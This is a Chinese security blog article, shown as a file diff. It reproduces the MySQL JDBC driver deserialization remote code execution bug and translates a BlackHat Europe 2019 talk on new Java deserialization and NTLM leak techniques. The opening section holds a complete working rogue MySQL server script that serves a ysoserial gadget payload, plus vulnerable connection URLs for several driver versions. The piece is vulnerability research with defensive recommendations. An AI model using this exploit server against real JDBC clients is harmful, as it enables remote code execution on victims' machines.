@@ -1,0 +1,560 @@
+# 探探JDBC反序列化漏洞
+
+阅读量 **456329**
+
+|评论 **7**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-04-16 14:30:49
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p4.ssl.qhimg.com/t01614b1a30beb37d94.jpg)
+
+作者：苏宇@涂鸦智能安全实验室
+
+## 漏洞复现
+
+文章开始，先带大家复现JDBC反序列化漏洞  
+我修改了原文：<https://xz.aliyun.com/t/8159> 的mysql恶意服务启动代码，如下
+
+    
+    
+    # -*- coding:utf-8 -*-    import socket
+    import binascii
+    import os
+    import sys
+    import subprocess
+    
+    def receive_data(conn):
+        data = conn.recv(1024)
+        return str(data).lower()
+    def send_data(conn,data):
+        conn.send(binascii.a2b_hex(data))
+    def trans(s):
+        return "%s" % ''.join('%.2x' % x for x in s)
+    def run():
+        while 1:
+            conn, addr = sk.accept()
+            print("Connection come from {}:{}".format(addr[0],addr[1]))
+            send_data(conn,"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400")
+            while True:
+                receive_data(conn)
+                send_data(conn,"0700000200000002000000")
+                data=receive_data(conn)
+                if "session.auto_increment_increment" in data:
+                    _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
+                    send_data(conn,_payload)
+                    data=receive_data(conn)
+                elif "show warnings" in data:
+                    _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
+                    send_data(conn, _payload)
+                    data = receive_data(conn)
+                if "set names" in data:
+                    send_data(conn, "0700000200000002000000")
+                    data = receive_data(conn)
+                if "set character_set_results" in data:
+                    send_data(conn, "0700000200000002000000")
+                    data = receive_data(conn)
+                if "show session status" in data:
+                    mysql_data = '0100000102'
+                    mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
+                    mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
+                    payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
+                    payload_length_hex = payload_length[2:4] + payload_length[0:2]
+                    data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
+                    data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
+                    mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
+                    mysql_data += str(payload_content)
+                    mysql_data += '07000005fe000022000100'
+                    send_data(conn, mysql_data)
+                    data = receive_data(conn)
+                if "show warnings" in data:
+                    payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
+                    send_data(conn, payload)
+                break
+    if __name__ == '__main__':
+        HOST ='0.0.0.0'
+        PORT = 3306
+        popen = subprocess.Popen(['java','-jar', 'ysoserial.jar', 'CommonsCollections7', "open /System/Applications/Calculator.app"], stdout=subprocess.PIPE)
+        payload_content=trans(popen.stdout.read())
+        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sk.bind((HOST, PORT))
+        sk.listen(1)
+        print("start fake mysql server listening on {}:{}".format(HOST,PORT))
+        run()
+    
+
+python脚本目录下放置：ysoserial.jar即可，具体可根据自己的需要自定义
+
+打exp之前准备3个文件：
+
+  * mysql-connector-java-8.0.11.jar
+  * commons-collections-3.2.1.jar
+  * JDBCRce.java
+
+JDBCRce代码如下：
+
+    
+    
+    import java.sql.*;
+    
+    public class JDBCRce {
+        public static void main(String[] args) throws Exception{
+            String driver = "com.mysql.cj.jdbc.Driver";
+            // String driver = "com.mysql.jdbc.Driver";//
+            String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";//8.x-8.0.19
+            // String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";//6.x(属性名不同)
+            // String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";//5.1.11及以上的5.x版本（包名没有了cj）5.1.10及以下的5.1.X版本需要连接后执行查询。
+            // String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?detectCustomCollations=true&autoDeserialize=true"//5.1.29-5.1.40
+            // String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?autoDeserialize=true"//5.1.28-5.1.19
+            Class.forName(driver);
+            Connection conn = DriverManager.getConnection(DB_URL);
+                }
+    }
+    
+
+运行python脚本后，再执行
+
+    
+    
+    javac -cp .:mysql-connector-java-8.0.19.jar:commons-collections-3.2.1.jar JDBCRce.java
+    java -cp .:mysql-connector-java-8.0.19.jar:commons-collections-3.2.1.jar JDBCRce
+
+## 漏洞跟踪
+
+1.搜索.readObject
+
+![](https://p5.ssl.qhimg.com/t01a76f3a9e35da8fdc.png)
+
+    
+    
+        @Override
+        public Object getObject(int columnIndex) throws SQLException {
+          ... ...
+    case BLOB:
+                    if (field.isBinary() || field.isBlob()) {
+                        byte[] data = getBytes(columnIndex);
+    
+                        if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {
+                            Object obj = data;
+    
+                            if ((data != null) && (data.length >= 2)) {
+                                if ((data[0] == -84) && (data[1] == -19)) {
+                                    // Serialized object?
+                                    try {
+                                        ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
+                                        ObjectInputStream objIn = new ObjectInputStream(bytesIn);
+                                        obj = objIn.readObject();
+                                        objIn.close();
+                                        bytesIn.close();
+                                    } catch (ClassNotFoundException cnfe) {
+                                        throw SQLError.createSQLException(Messages.getString("ResultSet.Class_not_found___91") + cnfe.toString()
+                                                + Messages.getString("ResultSet._while_reading_serialized_object_92"), getExceptionInterceptor());
+                                    } catch (IOException ex) {
+                                        obj = data; // not serialized?
+                                    }
+                                } else {
+                                    return getString(columnIndex);
+                                }
+                            }
+    
+                            return obj;
+                        }
+    
+                        return data;
+                    }
+    
+                    return getBytes(columnIndex);
+    
+
+调用getObject的方法
+
+    
+    
+    com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()
+    
+
+![](https://p5.ssl.qhimg.com/t014fc6a3df6c957239.png)
+
+JDBC连接数据库的过程中，会运行查询语句`SHOW SESSION STATUS`
+
+设置`autoDeserialize` 为true,就可以进入到readObject.
+
+## (议题翻译)Java反序列化攻击中的新利用技术
+
+> 这个漏洞是BlackHat Europe 2019会议中Back2Zero Team的议题，我花了点时间翻译了下
+
+###  大纲：
+
+• Java反序列化的介绍
+
+• 常见修复方案
+
+• Java中的严重漏洞
+
+​ • URLConnection
+
+​ • JDBC
+
+• Java反序列化的新攻击
+
+• Takeaways
+
+###  Java反序列化的介绍
+
+**序列化：**
+
+将Java对象转换为字节流的过程
+
+**反序列化：**
+
+从字节流创建Java对象的相反过程
+
+**如何利用？**
+
+·远程方法调用
+
+·通过网络将对象传输到远程系统
+
+·将对象存储在数据库或本地文件中以利用。
+
+![](https://p4.ssl.qhimg.com/t0153a65c54271edd87.png)
+
+###  攻击场景
+
+1.远程服务接受不可信的数据进行反序列化
+
+2.应用程序的类路径包括可序列化的类
+
+3.可序列化类的回调中存在危险函数
+
+###  魔术回调
+
+魔术方法将在反序列化进程中doing调用
+
+• readObject()
+
+• readExternal()
+
+• readResolve()
+
+• readObjectNoData()
+
+• validateObject()
+
+• finalize()
+
+###  含漏洞的类
+
+public class DiskFileItem extends Serializable
+
+    
+    
+    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+     in.defaultReadObject();
+     OutputStream output = this.getOutputStream();
+     if (this.cachedContent != null) {
+     output.write(this.cachedContent);
+     } else {
+     FileInputStream input = new FileInputStream(this.dfosFile);
+     IOUtils.copy(input, output);
+     this.dfosFile.delete();
+     this.dfosFile = null;
+     }
+     output.close();
+     this.cachedContent = null;
+    }
+    Vulnerable Class
+    p
+    
+
+###  常见修复方案
+
+**黑名单检查**
+
+在反序列化过程中验证输入流，如果在反序列化过程中找到了黑名单中的类，则反序列化过程将终止
+
+• SerialKiller
+
+• Jackson
+
+• Weblogic
+
+**JEP290 (过滤传入的序列化数据)**
+
+•允许对传入的对象序列化数据流进行过滤，以提高安全性
+
+•定义可以由属性或配置文件配置的全局过滤器。
+
+•在反序列化过程中将调用filter接口方法，以验证要反序列化的类。过滤器返回接受，拒绝或保留未确定，允许或禁止状态的状态。
+
+![](https://p2.ssl.qhimg.com/t017cb02b4120937caa.png)
+
+jre/lib/security/java.security
+
+    
+    
+    jdk.serialFilter=pattern;pattern
+    jdk.serialFilter=!sun.rmi.server.**;
+    jdk.serialFilter=!org.codehaus.groovy.runtime.**;
+    jdk.serialFilter=org.apache.commons.beanutils.BeanComparator
+    jdk.serialFilter=!org.codehaus.groovy.runtime.MethodClosure
+    
+
+**运行时应用程序自我保护（RASP）**
+
+RASP是一种内置或链接到应用程序或应用程序运行时环境中的安全技术，能够控制应用程序的执行并检测和防止实时攻击
+
+**Java-Agent**
+
+•为应用程序提供检测功能的软件组件。
+
+•无需构建模式列表（黑名单）来与有效载荷相匹配，因为它们通过设计提供保护。
+
+•RASP的大多数策略仅集中于不安全的反序列化攻击，这些攻击试图执行命令并使用网络请求提供的输入数据。
+
+###  防御方式的缺陷
+
+•依赖黑名单：找到新的gadget绕过  
+•安全研究者乐于寻找能够调用危险命令执行功能的gadget，比如Processbuider.exec  
+•修复方案仅关注常见的微信命令执行功能：如果我们在java中找到一个新的基本向量，那么我们就能发现很多新的gadaget同时绕过大部分修复。
+
+**我们的目标**
+
+    
+    
+       •Java中的新向量
+       •远程命令执行
+       •基础类
+    
+
+###  Java中的严重漏洞
+
+**URLConnection**
+
+•它包含许多方法，可让您与URL进行通信。  
+•代表应用程序和URL之间的通信链接的所有类的超类。  
+•大多数Java本机函数或应用程序将使用URLConnection发送HTTP请求。
+
+**通过调用JNI函数，URLConnection最终将调用Windows API
+initsecuritycontext，该函数是获取本地Windows凭据的函数。**
+
+![](https://p5.ssl.qhimg.com/t017acf893fe5011e57.png)
+
+**Java的默认行为不会判断URL的有效性，但始终返回true。**
+
+    
+    
+    static class DefaultNTLMAuthenticationCallback extends NTLMAuthenticationCallback{
+     DefaultNTLMAuthenticationCallback() {
+     public boolean isTrustedSite(URL var1) {
+     return true;
+     }
+     }
+    
+
+###  NTLM反射攻击（ CVE-2019-1040）
+
+**NTLM身份验证**
+
+•远程服务的网络身份验证  
+•质询响应身份验证机制  
+•Windows上的NTLM安全支持提供程序支持  
+•NTLMv1 / NTLMv2 / NTLM2会话  
+•HTTP，SMB，LDAP，MSSQL等
+
+**时间线**
+
+MS08-068  
+• Patch for SMB->SMB Reflection Attack  
+• Can not stop Attacker from relaying the Net-NTLM Hash to another machine or
+Perform  
+Cross-Protocol Reflection attack.
+
+MS16-075  
+• Patch for HTTP->SMB Reflection Attack(HotPotato)
+
+###  Java中的严重漏洞
+
+**JDBC**
+
+**Java数据库连接**
+
+**什么是JDBC**
+
+• Java Standard Edition平台的一部分。  
+• Java API，它定义客户端如何访问数据库。
+
+**为什么用JDBC**
+
+• 建立与数据库的连接。  
+• 对数据库执行查询并更新语句。  
+• 从数据库检索结果。
+
+    
+    
+    public static void main(String[] args) throws Exception{
+     String DB_URL = "jdbc:mysql://127.0.0.1:3306/sectest?var=value";
+     Driver driver = new com.mysql.jdbc.Driver();
+     //Make a database connection
+     Connection conn = driver.connect(DB_URL, props);
+     Statement stmt = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,….);
+    }
+    
+
+###  Java数据库连接
+
+**连接数据库URL**
+
+jdbc://driver://host:端口/database?配置name1=配置Value1&配置name2=配置Value2。。。
+
+**参数**
+
+•配置属性定义了如何与MySQL服务器建立连接。  
+•配置name=配置Value表示一个可选的属性列表。  
+•这些属性使您可以指示MySQL连接时执行各种任务。
+
+参数 | 含义  
+---|---  
+loadDataLocal | Server asked for stream in response to LOAD DATA LOCAL INFILE  
+requireSSL | Require server support of SSL connection if useSSL=true  
+socksProxyHost | Name or IP address of SOCKS host to connect through  
+useAsyncProtocol | Use asynchronous variant of X Protocol  
+useServerPrepStmts | Use server-side prepared statements if the server
+supports them  
+allowUrlInLoadLocal | Should the driver allow URLs in ‘LOAD DATA LOCAL INFILE’
+statements  
+  
+**危险参数**
+
+**autoDeserialize**
+
+•驱动程序是否应该自动检测同时对存储在BLOB字段中的对象进行反序列化？  
+•需要先调用getObject函数。
+
+    
+    
+    public Object getObject(int columnIndex) throws SQLException {
+    ……
+    case BLOB:
+     if (this.connection.getPropertySet().getBooleanProperty(PropertyDefinitions.PNAME_autoDeserialize).getValue()) {
+     Object obj = data;
+     // Serialized object?
+     try {
+     ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
+     ObjectInputStream objIn = new ObjectInputStream(bytesIn);
+     obj = objIn.readObject();
+     }
+     }
+    }
+    
+
+**queryInterceptors**
+
+QueryInterceptor的实现逗号分隔的列表，应将其放置在执行查询的中间来影响结果
+
+com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
+
+![](https://p5.ssl.qhimg.com/t01050ac22e2619a3a5.png)
+
+•queryInterceptors调用getObject
+
+•autoDeserialize允许反序列化来自服务器的数据
+
+攻击JDBC的步骤
+
+1.攻击者建立了数据库服务
+
+2.攻击者向JDBC URI投毒
+
+3.受害者与攻击者建立JDBC连接
+
+4.将有效载荷返回受害者
+
+合并3个漏洞并导致RCE
+
+1.利用反序列化漏洞触发HTTP请求。  
+2.URLConnection的NTLM HASH泄漏漏洞（CVE-2019-2426）  
+3.执行NTLM反射攻击的新技术（CVE-2019-1040）
+
+###  案例
+
+**反序列化漏洞**
+
+**新的受害者**
+
+**1.URLConnection**
+
+•NTLM泄漏（CVE-2019-2426）  
+•NTLM反射攻击的新技术（CVE-2019-1040）
+
+**2.JDBC**
+
+•Mysql驱动RCE  
+•JDBC驱动中的NTLM泄漏漏洞
+
+###  建议
+
+**•开发者**
+
+    
+    
+    •不要反序列化不受信任的数据
+    •不要将HTTP请求发送到不受信任的服务器（如果客户端在Windows上）
+    •不要通过JDBC连接到不受信任的数据库
+    •加密序列化的字节码
+    
+
+**•安全研究员**
+
+    
+    
+    •使用黑名单时，请仔细审核安全策略。尝试使用白名单来减轻风险。 
+    •使用这两个向量对应用程序进行fuzz。 
+    •静态分析可以轻松找到JDBC漏洞。
+    
+
+漏洞悬赏计划：涂鸦智能安全响应中心 (<https://src.tuya.com>) 欢迎白帽子来探索。  
+招聘内推计划：涵盖安全开发、安全测试、代码审计、安全合规等所有方面的岗位，简历投递[sec@tuya.com](mailto:sec@tuya.com)，请注明来源。
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **唐小风** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/237357](/post/id/237357)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [漏洞分析](/tag/漏洞分析)
+  * [Web安全](/tag/Web安全)
+  * [Java](/tag/Java)
+  * [jdbc](/tag/jdbc)
+
+ **+1** __35赞
+
+ __收藏
+
+![](https://p4.ssl.qhimg.com/t01a279dfcaa17e3340.png) 唐小风
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
